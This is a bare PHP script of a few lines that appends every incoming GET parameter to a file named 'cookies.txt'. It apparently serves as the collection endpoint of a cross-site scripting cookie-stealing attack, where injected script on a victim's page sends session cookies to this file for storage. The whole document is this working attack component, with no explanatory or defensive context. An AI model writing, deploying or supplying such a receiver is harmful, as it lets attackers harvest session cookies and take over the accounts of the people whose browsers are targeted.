<?php
$handle = fopen('cookies.txt', 'a');
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable . '=' . $value . "\r\n");
}
fclose($handle);
exit;